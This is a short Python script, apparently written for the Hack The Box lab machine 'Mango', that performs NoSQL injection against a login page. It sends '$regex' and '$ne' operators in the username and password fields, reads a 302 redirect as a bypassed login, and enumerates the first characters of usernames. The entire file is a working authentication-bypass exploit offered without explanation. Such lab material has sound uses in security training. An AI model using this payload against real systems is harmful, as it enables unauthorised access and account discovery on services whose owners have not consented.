from requests import post
from string import lowercase

url = 'http://staging-order.mango.htb/'
valid = ['a','d','g','i','m','n','o']

def sendPayload(word):
    regex = '^{}.*'.format(word)
    data = { 'username[$regex]':regex, 'password[$ne]':'password','login':'login' }
    response = post(url, data = data, allow_redirects=False)
    if response.status_code == 302:
        return word
    else:
        return None

def getUser():
    for char in valid:
        if sendPayload(char) != None:
            print "Found username starting with {}".format(char)

if __name__ == '__main__':
    getUser()
